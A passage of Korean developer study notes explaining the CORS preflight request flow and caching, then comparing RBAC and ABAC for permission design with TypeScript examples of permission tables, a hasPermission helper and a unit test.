        
        사전 요청과 실제 요청의 흐름은 먼저 **사전 요청(OPTIONS)** 단계에서 브라우저가 `Access-Control-Request-Method: PUT`을 보내고 
        서버가 `Access-Control-Allow-Methods: PUT`으로 응답하여 `PUT` 메소드 사용 허용을 알려요. 
        
        그 다음 **실제 요청(PUT)** 이 전송되고 응답 본문이 정상적으로 수신  돼요!
        
        </aside>
        
        ```tsx
        ① 브라우저 → 서버: OPTIONS /resource.json
           (Access-Control-Request-Method: PUT)
                   ↓
        ② 서버 → 브라우저: 200 OK
           (Access-Control-Allow-Methods: PUT)
                   ↓
        ③ 브라우저 판단: "PUT 허용됐네!"
                   ↓
        ④ 브라우저 → 서버: PUT /resource.json (실제 요청)
                   ↓
        ⑤ 서버 → 브라우저: 200 OK + 응답 본문
                   ↓
        ⑥ 브라우저: JS에게 응답 데이터 전달 ✅
        ```

    - 사전 요청도 캐싱 가능!
      > 매 PUT 요청마다 OPTIONS를 한 번씩 더 보내는 건 낭비 → 캐싱 설정 가능!
        <aside>
        ⚠️
        
        `Access-Control-Max-Age` 헤더를 설정하면 브라우저가 사전 요청의 응답을 캐시할 수 있어요!
        
        </aside>
        
        ```tsx
        res.setHeader('Access-Control-Max-Age', '10'); // 10초간 캐시
        ```
        
        ```tsx
        첫 번째 PUT 요청:
          OPTIONS → PUT (사전 요청 발생)
        
        10초 이내 두 번째 PUT 요청:
          PUT만 (OPTIONS 생략! 캐시 사용) ← 네트워크 비용 절감
        ```

- **📚 블로그 읽고 ABAC 정리해보기 🍠**
  - **RBAC**의 한계에 대해 설명해주세요.
    - **RBAC** 란?
      사람의 **역할(Role)** 을 기준으로 권한을 부여해요. 예시로 `ADMIN이면 글 삭제 가능` 같은 방식!
    - 한계 점
      1. 단순한 시작

         ```tsx
         // 내가 쓴 글만 삭제 가능
         const canDelete = [user.id](http://user.id/) === challenge.ownerId;
         ```

         → 쉽고 깔끔함 **RBAC** 의 장점

      2. 요구 사항 추가

         ```tsx
         // 관리자도 삭제 가능하게
         const isOwner = user.id === challenge.ownerId;
         const isAdmin = user.appRole === 'ADMIN';
         const canDelete = isOwner || isAdmin;
         ```

         → 조건 하나 더 늘음

      3. 또 추가

         ```tsx
         // 원장도 자기 학원 학생 글은 삭제 가능
         const isPrincipal =
           user.academyRoles[challenge.academyId] === 'PRINCIPAL';
         const canDelete = isOwner || isAdmin || isPrincipal;
         ```

         → 조건 꼬이기 시작

      4. 한계 폭발

         ```tsx
         // 원장인데 삭제 권한 없는 원장도 있음
         const canPrincipalDelete =
           isPrincipal &&
           user.academyRolesDetail[challenge.academyId]?.canDeleteChallenge;
         const canDelete = isOwner || isAdmin || canPrincipalDelete;
         ```

         → 역할(PRINCIPAL)만으로는 표현이 안 돼요. 추가 속성이 필요한 상황 옴!

    - 한계 정리!
      ```tsx
      RBAC의 한계
        ├── "역할이 같아도 권한이 다를 수 있음" → 표현 불가
        ├── "한 사람이 여러 맥락에 속함" → 표현 불가
        └── "권한 로직이 UI 여기저기에 퍼짐" → 유지보수 지옥
      ```
      → 이처럼 심플해서 좋지만, 서비스가 커지면 한계가 옴!

  - **ABAC**으로의 전환, 어떤 '기준'이 적절할까요?
    - 신호 1: "같은 역할인데 권한이 달라야 해요”

      ```tsx
      원장(PRINCIPAL) A → 챌린지 삭제 가능
      원장(PRINCIPAL) B → 챌린지 삭제 불가능

      → 역할이 같은데 권한이 다름
      → RBAC으로는 표현 불가 → ABAC 전환 신호 🚨
      ```

    - 신호 2: "맥락(context)에 따라 권한이 달라야 해요”

      ```tsx
      같은 사람이:
        A 학원에서는 원장 → 삭제 가능
        B 학원에서는 학생 → 삭제 불가능

      → 누구냐가 아니라 "어디서, 어떤 상황이냐"가 중요해짐
      → ABAC 전환 신호 🚨
      ```

    - 신호 3: "권한 조건 if 문이 3개 이상 겹치기 시작함”

      ```tsx
      // 이런 코드가 생기기 시작했다면?
      const canDelete = isOwner || isAdmin || (isPrincipal && canDeleteFlag);

      // 그리고 이게 여러 컴포넌트에 복붙되고 있다면?
      → ABAC 전환 신호 🚨
      ```

    - 신호 4: "기획이 바뀔 때마다 코드를 여러 군데 수정해야 함”
      ```tsx
      기획 변경 → 5개 파일 열어서 수정 → 하나 빠뜨림 → 버그
      → ABAC 전환 신호 🚨
      ```
    - 전환하지 않아도 되는 경우
      ```tsx
      ✅ RBAC으로 충분한 경우:
        - 권한 조건이 단순함 (역할만으로 표현 가능)
        - 서비스 초기, 빠른 개발이 우선
        - 예외 케이스가 거의 없음
        - 역할이 3개 이하로 단순함
      ```
      > 💡 **결론:** "같은 역할인데 다른 권한이 필요한 순간"이 오면 ABAC을 고려하세요. 그 전까지는 RBAC으로 단순하게 가는 게 오히려 좋아요.

  - 어떤 서비스 영역에 **RBAC**을 남겨두고, **ABAC**을 도입하시겠어요?
      <aside>
      💡
      
      핵심
      
      권한을 **앱 전역 권한**과 **학원 권한**으로 분리하고, 각 권한의 세부 액션별로 **boolean 혹은 커스텀 로직**으로 처리하는 방식!
      
      </aside>
      
      - RBAC을 남겨두기 좋은 영역: 앱 전역 권한
          
          ```tsx
          // ADMIN은 어디서든 뭐든 할 수 있음 → 역할만으로 표현 가능
          export const APP_ROLES = {
            ADMIN: {
              challenges: {
                view: true,    // 단순 boolean
                create: true,
                update: true,
                delete: true,  // 조건 없이 항상 가능
              },
            },
            ...
          }
          ```
          
      - RBAC이 적합한 영역
          
          ```tsx
          ✅ 슈퍼 관리자(ADMIN) 권한 → 전부 다 됨, 단순
          ✅ 완전히 차단된 권한 → 전부 안 됨, 단순
          ✅ 서비스 전체에 걸쳐 동일하게 적용되는 권한
          ✅ 예외 없이 역할만으로 판단 가능한 기능
            예: 관리자 페이지 접근, 서비스 전체 공지 작성 등
          ```
          
      - ABAC을 도입하기 좋은 영역: 맥락이 필요한 권한
          
          ```tsx
          // 원장인데 삭제 권한이 있는 원장만 삭제 가능 → 속성 필요
          export const ACADEMY_ROLES = {
            PRINCIPAL: {
              challenges: {
                delete: (user, challenge) => {
                  const role = user.academyRoles[challenge.academyId];
                  const detail = user.academyRolesDetail?.[challenge.academyId];
                  return role === 'PRINCIPAL' && detail?.canDeleteChallenge === true;
                  // 역할(PRINCIPAL) + 속성(canDeleteChallenge) 조합
                },
              },
            },
          }
          ```
          
      - ABAC이 적합한 영역
          
          ```tsx
          ✅ 콘텐츠 소유권이 필요한 기능
            예: "내가 쓴 글만 수정 가능"
          
          ✅ 소속/맥락에 따라 권한이 달라지는 기능
            예: "내 학원의 학생 글만 삭제 가능"
          
          ✅ 세밀한 권한 플래그가 필요한 기능
            예: "원장 중에서 canDeleteChallenge=true인 원장만"
          
          ✅ 차단(block) 같은 관계 기반 권한
            예: "나를 차단한 사람의 글은 못 봄"
          ```
          
      - 실제 설계 예시
          
          ```tsx
          앱 전역 권한 (RBAC 스타일)
            ADMIN → 모든 것 허용 (boolean true)
            USER  → 기본 권한만
          
          학원별 권한 (ABAC 스타일)
            PRINCIPAL + canDeleteChallenge=true → 챌린지 삭제 가능
            TEACHER → 챌린지 삭제 불가
            STUDENT → 본인 글만 삭제 가능
          ```
          
      
      > 💡 **핵심
      :** RBAC과 ABAC은 대체 관계가 아니에요. **단순한 건 RBAC으로, 복잡한 건 ABAC으로** 함께 쓰는 게 가장 현실적인 답이에요!
      >

  - 여러분들은 다른 부서에서 요청을 받았을 때 어떤식으로 행동하실 건가요?
    1. 확장 가능성을 먼저 물어보기
    2. 요청을 분석할 때: "역할"인지 "속성"인지 파악하기

       ```tsx
       "원장은 삭제 가능"
       → 역할(PRINCIPAL)만으로 표현 가능
       → RBAC으로 처리 가능
       ```

       ```tsx
       "삭제 권한이 있는 원장만 삭제 가능"
       → 역할(PRINCIPAL) + 속성(canDeleteChallenge)
       → ABAC 필요 → 백엔드에 데이터 요청 필요
       ```

    3. 구현할 때: 권한 로직을 한 곳에 모으기

       ```tsx
       리팩토링 후에는 권한 조건이 UI에 섞이지 않고 권한 테이블에만 정의되어 있어서
       어디서든 일관되게 hasPermission 한 줄로 체크를 할 수 있어요

       // ❌ 요청마다 UI에 조건을 추가하는 방식
       const canDelete = isOwner || isAdmin || (isPrincipal && canDeleteFlag);

       // ✅ 권한 테이블만 수정하고 호출은 항상 한 줄
       const canDelete = hasPermission(user, 'challenges', 'delete', challenge);
       ```

    4. 배포 후에도: 테스트 코드로 안전망 확보

       ```tsx
       // 새 요청이 들어와서 권한 테이블을 수정했을 때
       // 기존 케이스가 망가지지 않았는지 테스트로 검증
       it('ADMIN은 어떤 챌린지든 삭제할 수 있다', () => {
         expect(hasPermission(관리자, 'challenges', 'delete', 챌린지)).toBe(
           true,
         );
       });
       ```
